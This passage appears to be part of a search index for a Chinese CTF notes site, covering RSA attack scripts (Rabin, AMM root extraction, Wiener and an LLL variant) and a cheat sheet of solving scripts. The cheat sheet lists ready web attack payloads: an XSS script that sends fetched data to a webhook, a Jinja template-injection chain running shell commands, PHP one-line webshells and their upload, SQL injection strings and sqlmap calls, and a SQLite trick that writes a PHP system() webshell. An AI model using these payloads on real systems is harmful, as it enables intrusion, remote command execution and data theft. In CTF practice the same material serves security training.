\u5bc6\u6587\uff1a $$ c = m^2\\bmod n $$","title":"\u4f8b\uff11\u3000Rabin \u7b97\u6cd5"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#p-q-3-mod-4","text":"import gmpy2 # \u5982\u679c p \u2261 q \u2261 3 ( mod 4 ) def rabin_decrypt ( c , p , q , e = 2 ): n = p * q mp = pow ( c , ( p + 1 ) // 4 , p ) mq = pow ( c , ( q + 1 ) // 4 , q ) yp = gmpy2 . invert ( p , q ) yq = gmpy2 . invert ( q , p ) r = ( yp * p * mq + yq * q * mp ) % n rr = n - r s = ( yp * p * mq - yq * q * mp ) % n ss = n - s return ( r , rr , s , ss ) c = p = q = m = rabin_decrypt ( c , p , q ) for i in range ( 4 ): try : print ( bytes . fromhex ( hex ( m [ i ])[ 2 :])) except : pass","title":"\u5982\u679c  p \u2261 q \u2261 3 ( mod 4 )"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#p-1-or-q-1-mod-4","text":"AMM, \u5168\u79f0\u4e3aAdleman-Mander-Miller Method\u3002\u57281977\u5e74\u4ed6\u4eec\u53d1\u8868\u7684\u8bba\u6587\u91cc\u53ea\u6d89\u53ca\u4e86\u5f00\u5e73\u65b9\u6839\u7684\u65b9\u6cd5\uff0c\u5f00n\u6b21\u65b9\u6839\u5e76\u6ca1\u6709\u5f88\u8be6\u7ec6\u7684\u4ecb\u7ecd\u3002\u300a Adleman-Manders-Miller Root Extraction Method Revisited \u300b\u91cc\u4e09\u4f4d\u4e2d\u56fd\u4eba\u8865\u5145\u4e86\u4ed6\u4eec\u5f00n\u6b21\u65b9\u6839\u7684\u65b9\u6cd5\u3002 from Crypto.Util.number import long_to_bytes import random import time import gmpy2 # About 3 seconds to run def AMM ( o , r , q ): start = time . time () print ( ' \\n ----------------------------------------------------------------------------------' ) print ( 'Start to run Adleman-Manders-Miller Root Extraction Method' ) print ( 'Try to find one {:#x} th root of {} modulo {} ' . format ( r , o , q )) g = GF ( q ) o = g ( o ) p = g ( random . randint ( 1 , q )) while p ^ (( q - 1 ) // r ) == 1 : p = g ( random . randint ( 1 , q )) print ( '[+] Find p: {} ' . format ( p )) t = 0 s = q - 1 while s % r == 0 : t += 1 s = s // r print ( '[+] Find s: {} , t: {} ' . format ( s , t )) k = 1 while ( k * s + 1 ) % r != 0 : k += 1 alp = ( k * s + 1 ) // r print ( '[+] Find alp: {} ' . format ( alp )) a = p ^ ( r ^ ( t - 1 ) * s ) b = o ^ ( r * alp - 1 ) c = p ^ s h = 1 for i in range ( 1 , t ): d = b ^ ( r ^ ( t - 1 - i )) if d == 1 : j = 0 else : print ( '[+] Calculating DLP...' ) j = - discrete_log ( a , d ) print ( '[+] Finish DLP...' ) b = b * ( c ^ r ) ^ j h = h * c ^ j c = c ^ r result = o ^ alp * h end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) print ( 'Find one solution: {} ' . format ( result )) return result def findAllPRoot ( p , e ): print ( \"Start to find all the Primitive {:#x} th root of 1 modulo {} .\" . format ( e , p )) start = time . time () proot = set () while len ( proot ) < e : proot . add ( pow ( random . randint ( 2 , p - 1 ), ( p - 1 ) // e , p )) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) return proot def findAllSolutions ( mp , proot , cp , p ): print ( \"Start to find all the {:#x} th root of {} modulo {} .\" . format ( e , cp , p )) start = time . time () all_mp = set () for root in proot : mp2 = mp * root % p assert ( pow ( mp2 , e , p ) == cp ) all_mp . add ( mp2 ) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start )) return all_mp c = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406 p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741 e = 4919 cp = c % p cq = c % q mp = AMM ( cp , e , p ) mq = AMM ( cq , e , q ) p_proot = findAllPRoot ( p , e ) q_proot = findAllPRoot ( q , e ) mps = findAllSolutions ( mp , p_proot , cp , p ) mqs = findAllSolutions ( mq , q_proot , cq , q ) def check ( m ): h = m . hex () if len ( h ) & 1 : return False tmp = long_to_bytes ( m ) if tmp . startswith ( b '*CTF' ): print ( tmp ) return True else : return False # About 16 mins to run 0x1337^2 == 24196561 times CRT start = time . time () print ( 'Start CRT...' ) for mpp in mps : for mqq in mqs : solution = CRT_list ([ int ( mpp ), int ( mqq )], [ p , q ]) if check ( solution ): print ( solution ) exit () print ( time . time () - start ) end = time . time () print ( \"Finished in {} seconds.\" . format ( end - start ))","title":"\u5982\u679c  p \u2261 1 or q \u2261 1 ( mod 4 )"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#2-wieners-attack","text":"","title":"\u4f8b2 Wiener's Attack"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#_6","text":"\u5728 d \u6bd4\u8f83\u5c0f\uff08e\u5f88\u5927)\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002 from Crypto.Util.number import long_to_bytes N = 13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929 e = 2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877 c = 5050700824254369629706222317182304817854328502946762466640160034518936104331190872577165966740698992599993738318065255426640532388783701269523249466457133362594746792709049331755573439792147596921989197734488068944429765799441691036386928330707210973914074578898342882873616545592434522483589258331701541867114404243232706375190196458540529576587657819733333494394523717323185402624115436179872398952968236327891601604027452104042607034392903007131961865175671712730843855271756666933385216702709156167983750382459620742910616481648578102406179645040011072888784105210037974451473774905783067038311390636241835590091 for phi in [ phi [ 0 ] for k , d in [ f . as_integer_ratio () for f in ( e / N ) . continued_fraction () . convergents () ] #if k != 0 and (phi := divmod(e * d - 1, k))[1] == 0 if k != 0 and ( phi := divmod ( e * d - 1 , k )) ]: x = PolynomialRing ( RationalField (), \"x\" ) . gen () if len ( roots := ( x ** 2 - ( N - phi + 1 ) * x + N ) . roots ()) == 2 : print ( long_to_bytes ( pow ( c , inverse_mod ( e , ( roots [ 0 ][ 0 ] - 1 ) * ( roots [ 1 ][ 0 ] - 1 )), N ) ) )","title":"\u7ef4\u7eb3\u653b\u51fb"},{"location":"other/CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/#wiener","text":"Everything is Still Big N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9 e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d c = 0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac s = floor ( sqrt ( N )) M = Matrix ([[ e , s ], [ N , 0 ]]) Mred = M . LLL () D = [ abs ( Mred [ i , 1 ]) // s for i in [ 0 , 1 ]] for d in D : t = randint ( 2 , N - 2 ) tt = pow ( t , e , N ) if tt ^ d != t : continue flag = int ( pow ( c , d , N )) flag = flag . to_bytes (( flag . bit_length () + 7 ) // 8 , 'big' ) print ( f 'FLAG: { flag . decode () } ' )","title":"\u6269\u5c55Wiener\u653b\u51fb"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/","text":"\u7f16\u7801\u89e3\u7801 import html s = \"&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;\" html . unescape ( s ) #key{you are right} # html.escape(s) # urlencode, urldecode from urllib import parse s = \"https://vjob.top/Bash/ %E 5%BA %94% E8%AF%A5 %E 7 %9F %A5 %E 9 %81% 93 %E 7%9A %84Li nux %E 6%8A %80% E5%B7%A7/\" print ( parse . unquote ( s )) # parse.quote(s) # \u667a\u80fd\u5224\u65ad\u7f16\u7801\u7c7b\u578b import chardet chardet . detect ( s . encode ( 'utf-8' )) # {'encoding': 'utf-8', 'confidence': 0.99, 'language': ''} \u7206\u7834 x = b 'SRJPSQBUJYPHNC' for i in range ( 1 , 26 ): r = [] for j in x : if j == ord ( ' ' ): r . append ( j ) continue t = j + i if j <= ord ( 'z' ) and j >= ord ( 'a' ): if t > ord ( 'z' ): t = t - ord ( 'z' ) + ord ( 'a' ) - 1 elif j <= ord ( 'Z' ) and j >= ord ( 'A' ): if t > ord ( 'Z' ): t = t - ord ( 'Z' ) + ord ( 'A' ) - 1 r . append ( t ) print ( bytes ( r )) \u51ef\u6492\u5bc6\u7801 symbols = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890 !?.' ciphertext = input ( \"Please input ciphertext: \\n \" ) # guv6Jv6Jz!J6rp5r7Jzr66ntrM for key in range ( len ( symbols )): ciphers = symbols [ key :] + symbols [: key ] transtab = str . maketrans ( ciphers , symbols ) plaintext = ciphertext . translate ( transtab ) print ( f 'Key # { key } : { plaintext } ' ) # Key #13: This is my secret message. \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728\u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0\uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1aROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09 base64\u6362\u8868 import base64 import string str1 = \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\" string1 = \"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 )))) AES\u52a0\u5bc6\u89e3\u5bc6 from Crypto.Cipher import AES def AES_Encrypt ( key , data ): #vi = b'0102030405060708' #cipher = AES.new(key, AES.MODE_CBC vi) cipher = AES . new ( key , AES . MODE_ECB ) #pad = lambda s: s + (16 - len(s)%16) * (16 - len(s)%16).to_bytes(1,\"little\") #data = pad(data) encryptedbytes = cipher . encrypt ( data ) return encryptedbytes def AES_Decrypt ( key , data ): #vi = b'0102030405060708' #cipher = AES.new(key, AES.MODE_CBC vi) cipher = AES . new ( key , AES . MODE_ECB ) text_decrypted = cipher . decrypt ( data ) #unpad = lambda s: s[0:-s[-1]] #text_decrypted = unpad(text_decrypted) return text_decrypted rawkey = b 'this_is_the_key.' key = [] for i in range ( 0 , len ( rawkey ), 2 ): key . append ( rawkey [ i + 1 ]) key . append ( rawkey [ i ]) key = bytes ( key ) print ( \"key = \" , key ) data = [ 21 , - 93 , - 68 , - 94 , 86 , 117 , - 19 , - 68 , - 92 , 33 , 50 , 118 , 16 , 13 , 1 , - 15 , - 13 , 3 , 4 , 103 , - 18 , 81 , 30 , 68 , 54 , - 93 , 44 , - 23 , 93 , 98 , 5 , 59 ] enctext = b \"\" # int.from_bytes(data, byteorder='big', signed=True) for x in data : enctext = enctext + ( x % 256 ) . to_bytes ( 1 , \"little\" ) print ( \"data = \" , enctext ) #data = bytes(data) #key = b'0CoJUm6Qyw8W8jud' #data = b'sdadsdsdsfd' #enctext = AES_Encrypt(key, data) text_decrypted = AES_Decrypt ( key , enctext ) print ( text_decrypted ) \u6469\u5c14\u65af\u7535\u7801 \u53c8\u8bd1\u4e3a\u6469\u65af\u5bc6\u7801\uff0cMorse code MorseList = { \".-\" : \"A\" , \"-...\" : \"B\" , \"-.-.\" : \"C\" , \"-..\" : \"D\" , \".\" : \"E\" , \"..-.\" : \"F\" , \"--.\" : \"G\" , \"....\" : \"H\" , \"..\" : \"I\" , \".---\" : \"J\" , \"-.-\" : \"K\" , \".-..\" : \"L\" , \"--\" : \"M\" , \"-.\" : \"N\" , \"---\" : \"O\" , \".--\uff0e} def morse ( string , sign = \" \" ): lists = string . split ( sign ) for code in lists : print ( MorseList . get ( code ), end = \"\" ) morse ( \"..-./.-../.-/--.\" , \"/\" ) struct \u6a21\u5757 import struct struct . pack ( '>I' , 16 ) # '\\x00\\x00\\x00\\x10' # pack\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c'>I'\u7684\u610f\u601d\u662f\uff1a # >\u8868\u793a\u5b57\u8282\u987a\u5e8f\u662fbig-endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0cI\u8868\u793a4\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002 struct . unpack ( '>IH' , b ' \\xf0\\xf0\\xf0\\xf0\\x80\\x80 ' ) # (4042322160, 32896) # bytes\u4f9d\u6b21\u53d8\u4e3a I\uff1a4\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570 H\uff1a2\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002 SimpleHTTPServer #!/usr/bin/env python3 import http.server as SimpleHTTPServer import socketserver as SocketServer PORT = 8001 class GetHandler ( SimpleHTTPServer . SimpleHTTPRequestHandler ): def do_GET ( self ): ip = self . client_address [ 0 ] print ( \"---------\" + ip + \"----------\" ) print ( self . headers ) self . send_response ( 200 ) self . send_header ( 'Content-type' , 'text/plain' ) self . end_headers () if self . path . endswith ( '/flag' ): self . wfile . write ( b 'flag {xxx} ' ) else : #SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) self . wfile . write ( ip . encode ()) Handler = GetHandler httpd = SocketServer . TCPServer (( \"\" , PORT ), Handler ) httpd . serve_forever () ### payload.js var request = new XMLHttpRequest (); request . onload = sendBack ; request . open ( 'GET' , 'https://xtra-salty-sardines.web.actf.co/flag' ); request . send (); function sendBack (){ location = '<WEB HOOK URL>/result?result=' + btoa ( this . responseText ); # https://webhook.site/ } \u6392\u5217\u7ec4\u5408 #Python\uff1a\u6392\u5217\u7ec4\u5408\u4e09\u4e2a\u51fd\u6570permutations,combinations,product from itertools import permutations , combinations , product a = [ 1 , 2 , 3 , 4 ] b = [ 5 , 6 , 7 , 8 ] A = permutations ( a , 3 ) # \u6392\u5217 print ( list ( A )) B = combinations ( a , 3 ) # \u7ec4\u5408 print ( list ( B )) C = product ( a , b ) # \u4e24\u4e2a\u96c6\u5408\u5143\u7d20\u7684\u4e92\u7ec4\u5408 print ( list ( C )) Python Web SSTI http://114.67.175.224:15295/?flag ={{ 4 *4 }} #\u786e\u8ba4\u5b58\u5728SSTI http://114.67.175.224:15295/?flag ={{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()}} #\u3000\u67e5\u770b\u51fd\u6570, OBJECT.__class__.__mro__[1].__subclasses__() http://114.67.175.224:15295/?flag ={{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]}} \u3000 # \u5b9a\u4f4dPopen {{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]( 'id' , shell = True, stdout = -1 ) .communicate ()[ 0 ] .strip () }} #\u6267\u884c\u547d\u4ee4 {{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]( 'cat flag ' , shell = True, stdout = -1 ) .communicate ()[ 0 ] .strip () }} # \u83b7\u53d6flag # \u5e38\u7528\u5230\u7684\u51e0\u4e2a\u9b54\u672f\u65b9\u6cd5 __class__ () \u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b __base__ () /__mro__ () \u8fd4\u56de\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b __subclasses__ () \u8fd4\u56de\u7ee7\u627f\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b ### {{ '' [ request.args.a ][ request.args.b ][ 2 ][ request.args.c ]()[ 40 ]( '/opt/flag_xxx.txt' )[ request.args.d ]()}} ? & a = __class__ & b = __mro__ & c = __subclasses__ & d = read ### ### Flask\u7279\u6709\u7684\u53d8\u91cf\u548c\u51fd\u6570 config \u3000\u3000config \u5bf9\u8c61\u5c31\u662fFlask\u7684config\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f app.config \u5bf9\u8c61 request \u3000\u3000Flask\u4e2d\u4ee3\u8868\u5f53\u524d\u8bf7\u6c42\u7684request\u5bf9\u8c61 session \u3000\u3000Flask\u7684session\u5bf9\u8c61 url_for () \u3000\u3000url_for\u4f1a\u6839\u636e\u4f20\u5165\u7684\u8def\u7531\u5668\u51fd\u6570\u540d,\u8fd4\u56de\u8be5\u8def\u7531\u5bf9\u5e94\u7684URL,\u5728\u6a21\u677f\u4e2d\u59cb\u7ec8\u4f7f\u7528url_for () \u5c31\u53ef\u4ee5\u5b89\u5168\u7684\u4fee\u6539\u8def\u7531\u7ed1\u5b9a\u7684URL,\u5219\u4e0d\u6bd4\u62c5\u5fc3\u6a21\u677f\u4e2d\u6e32\u67d3\u51fa\u9519\u7684\u94fe\u63a5 get_flashed_messages () \u3000\u3000\u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u4e4b\u524d\u5728flask\u4e2d\u901a\u8fc7flask () \u4f20\u5165\u7684\u6d88\u606f\u7684\u5217\u8868\uff0cflash\u51fd\u6570\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u53ef\u4ee5\u628a\u7531Python\u5b57\u7b26\u4e32\u8868\u793a\u7684\u6d88\u606f\u52a0\u5165\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u518d\u4f7f\u7528get_flashed_message () \u51fd\u6570\u53d6\u51fa\u5b83\u4eec\u5e76\u6d88\u8d39\u6389 # {{get_flashed_messages.__globals__['current_app'].config}} # {{url_for.__globals__['current_app'].config}} # tplmap https://github.com/epinna/tplmap.git PHP Web eval ( \"var_dump( $a );\" ) ; # var_dump(file('flag.php')); eval ( \"var_dump( $args );\" ) ; # var_dump(GLOBALS); php://filter/read = convert.base64-encode/resource = index.php\u3000\u3000 #\u6587\u4ef6\u5305\u542b https://blog.csdn.net/qq_32393893/article/details/110228864 key1 []= 1 & key2 []= 2 \u3000 # md5($key1) == md5($key2) && $key1 !== $key2 assert ( $_GET [ 's' ]) # ?s=system('ls') system | readfile | gz | exec | eval | cat | assert | file | fgets #passthru ### never_give_up # curl -X POST \"http://ip:port/index.php?id=x&a=php://input&b=%0012345\" --data \"bugku is a nice plateform!\" # file_get_contents \u7528 php://input \u7ed5\u8fc7 if ( ! $_GET [ 'id' ]) { header ( 'Location: hello.php?id=1' ) ; exit () ; } $id = $_GET [ 'id' ] ; $a = $_GET [ 'a' ] ; $b = $_GET [ 'b' ] ; if ( stripos ( $a , '.' )) { echo 'no no no no no no no' ; return ; } $data = @file_get_contents ( $a , 'r' ) ; if ( $data == \"bugku is a nice plateform!\" and $id == 0 and strlen ( $b ) >5 and eregi ( \"111\" .substr ( $b ,0,1 ) , \"1114\" ) and substr ( $b ,0,1 ) ! = 4 ) { $flag = \"flag{***********}\" } else { print \"never never never give up !!!\" ; } # \u6570\u7ec4\u7ed5\u8fc7 ( $v1 ! = $v2 && md5 ( $v1 ) == md5 ( $v2 )) # v1[]=1&v2[]=2 md5 ( array ()) = null sha1 ( array ()) = null ereg ( pattern,array ()) = null vs preg_match ( pattern,array ) = false strcmp ( array () , \"abc\" ) = null strpos ( array () , \"abc\" ) = null #\u5e8f\u5217\u5316 \u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u4e2a\u6570\u7684\u5c5e\u6027\u65f6\u5c31\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c\u3002\u3000\u3000 #\u7ed5\u8fc7__wakeup()\u51fd\u6570 \u6839\u636e\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\u7684\u4e0d\u540c \u5e8f\u5217\u5316\u540e\u7684 \u5c5e\u6027\u957f\u5ea6\u548c\u5c5e\u6027\u503c\u4f1a\u6709\u6240\u4e0d\u540c # - public ( \u516c\u6709 ) - protected ( \u53d7\u4fdd\u62a4 ) - private ( \u79c1\u6709\u7684 ) - protected\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00*%00\u5c5e\u6027\u540d - private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00\u7c7b\u540d%00\u5c5e\u6027\u540d <?php class ctf { protected $username = 'admin' ; //protected $cmd = 'file(\"flag.php\")' ; protected $cmd = 'tac flag.php' ; } $ctf = new ctf () ; var_dump ( serialize ( $ctf )) ; ?> $ php -f test.php string ( 78 ) \"O:3:\" ctf \":2:{s:11:\" *username \";s:5:\" admin \";s:6:\" *cmd \";s:12:\" tac flag.php \";}\" #\u77ed\u6807\u7b7e\u7ed5\u8fc7 ?flag = $a = 'blag' ; $a { 0 }= 'f' ; ?>11111110001111111 ; <? = $$ a ; ?>, \uff08\u7528<? = ?>\u4ee3\u66ffphp\u6807\u7b7e\u3002<? = ?>\u77ed\u6807\u7b7e\u4f1a\u76f4\u63a5\u628aphp\u7684\u7ed3\u679c\u8f93\u51fa\uff0c<? ?>\u7684\u529f\u80fd\u5219\u548c<?php?>\u5b8c\u5168\u4e00\u6837\u3002\u8fc7\u6ee4\u7a7a\u683c\u53ef\u4ee5\u7528 \\t \u7ed5\u8fc7\uff0c\u6216\u8005%09\u4e5f\u662ftab\u7684URL\u7f16\u7801\u3002php\u53cd\u5f15\u53f7\u4e2d\u7684\u5b57\u7b26\u4e32\u4f1a\u88ab\u5f53\u4f5c\u547d\u4ee4\u6267\u884c\uff09 \u901a\u8fc7php\u5185\u7f6e\u534f\u8bae\u76f4\u63a5\u8bfb\u53d6\u4ee3\u7801 /index.php?page = php://filter/read = convert.base64-encode/resource = index.php PHP\u6570\u7ec4key\u6ea2\u51fa\uff0c\u7b80\u5355\u7684\u8bf4\u5c31\u662fstuff [ 4294967296 ] \u8868\u793a\u7684\u503c\uff0c\u4e0estuff [ 0 ] \u662f\u4e00\u4e2a \u53c2\u8003https://bugs.php.net/bug.php?id = 69892\u7684\u63d0\u793a NodeJS vm . run ( Buffer ( 500 ) ); // \u5728\u8f83\u65e9\u4e00\u70b9\u7684 node \u7248\u672c\u4e2d (8.0 \u4e4b\u524d)\uff0c\u5f53 Buffer \u7684\u6784\u9020\u51fd\u6570\u4f20\u5165\u6570\u5b57\u65f6, \u4f1a\u5f97\u5230\u4e0e\u6570\u5b57\u957f\u5ea6\u4e00\u81f4\u7684\u4e00\u4e2a Buffer\uff0c\u5e76\u4e14\u8fd9\u4e2a Buffer \u662f\u672a\u6e05\u96f6\u7684\u30028.0 \u4e4b\u540e\u7684\u7248\u672c\u53ef\u4ee5\u901a\u8fc7\u53e6\u4e00\u4e2a\u51fd\u6570 Buffer.allocUnsafe(size) \u6765\u83b7\u5f97\u672a\u6e05\u7a7a\u7684\u5185\u5b58\u3002 curl #\u4e0a\u4f20\u6587\u4ef6test.png curl -X POST -F \"file=@test.png\" -H \"Content-Type: multipart/form-data\" 'http://host:port/post-file-path' # IP \u7ed5\u8fc7: -H \"X-Forwarded-For: 127.0.0.1\" # PHP \u4e00\u53e5\u8bdd\u6728\u9a6c \u5f62\u5f0f\uff11\u3000<?php eval ( @ $_POST [ '_' ]) ; ?> \u5f62\u5f0f\uff12\u3000<script language = \"php\" >@eval ( $_POST [ _ ]) </script> \u3000 curl ... --data-raw 'image=data%3Aimage/php%3Bbase64%2CPD9waHAgZXZhbChAJF9QT1NUWydfJ10pOyA/Pg%3D%3D' curl -X POST ... --data \"_=system(%22ls%22);\" curl ... -F \"file=@a.php4;type=image/jpeg\" -H \"Content-Type: multiPart/Form-data\" 'http://host:port/post-file-path' SQL\u6ce8\u5165 0 ' union select 1,2,3,4# #\u5b58\u5728\u6ce8\u5165 0' union select 1 , 2 , 3 , database () # # \u6570\u636e\u5e93\u540d 0 ' union select 1,2,3,table_name from information_schema.tables where table_schema=' skctf '#\u3000#\u8868\u540d 0' union select 1 , 2 , 3 , column_name from information_schema . columns where table_name = 'fl4g' # # \u5217\u540d 0 ' union select 1,2,3,skctf_flag from fl4g# # flag{...} python sqlmap.py -u ' http : // 114 . 67 . 175 . 224 : 13433 / index . php ' --data ' id = 1 ' --current-db python sqlmap.py -u ' http : // 114 . 67 . 175 . 224 : 13433 / index . php ' --data ' id = 1 ' --dump 1' ; SHOW DATABASES ; # # \u6570\u636e\u5e93\u540d 1 '; SHOW TABLES from ctftraining;# #\u8868\u540d 1' ; use ctftraining ; show columns from FLAG_TABLE ; # # \u5217\u540d # list ( b \"select * from supersqli.1919810931114514\" ) # Python convert , \u5173\u952e\u5b57 select | update | delete | drop | insert | where | . \u88ab\u8fc7\u6ee4 1 ';SET @a=char(115, 101, 108, 101, 99, 116, 32, 42, 32, 102, 114, 111, 109, 32, 115, 117, 112, 101, 114, 115, 113, 108, 105, 46, 49, 57, 49, 57, 56, 49, 48, 57, 51, 49, 49, 49, 52, 53, 49, 52);PREPARE hacker from @a;EXECUTE hacker;# # SQLlite ATTACH database can be used to write file ATTACH DATABASE ' XXX . php ' AS a ; CREATE TABLE a . b ( c text ); INSERT INTO a . b ( c ) VALUES ( \\ \"<?php system($_GET[0]); ?> \\\" ); \u5176\u5b83 # Android\u5907\u4efd\u6587\u4ef6\u89e3\u538b ( printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\" ; tail -c +25 app3.ab ) | tar xfvz - # \u6253\u5370\u6587\u4ef6 xargs cat < files # GitHack https://github.com/lijiejie/GitHack.git #git-dumper https://github.com/arthaud/git-dumper # GitTools https://github.com/internetwache/GitTools \u516d\u5341\u56db\u5366 _64gua = [ \"\u4e7e\",\"\u5764\",\"\u5c6f\",\"\u8499\",\"\u9700\",\"\u8bbc\",\"\u5e08\",\"\u6bd4\",\"\u5c0f\u755c\",\"\u5c65\",\"\u6cf0\",\"\u5426\",\"\u540c\u4eba\",\"\u5927\u6709\",\"\u8c26\",\"\u8c6b\",\"\u968f\",\"\u86ca\",\"\u4e34\",\"\u89c2\",\"\u566c\u55d1\",\"\u8d32\",\"\u5265\",\"\u590d\",\"\u65e0\u5984\",\"\u5927\u755c\",\"\u9890\",\"\u5927\u8fc7\",\"\u574e\",\"\u79bb\", 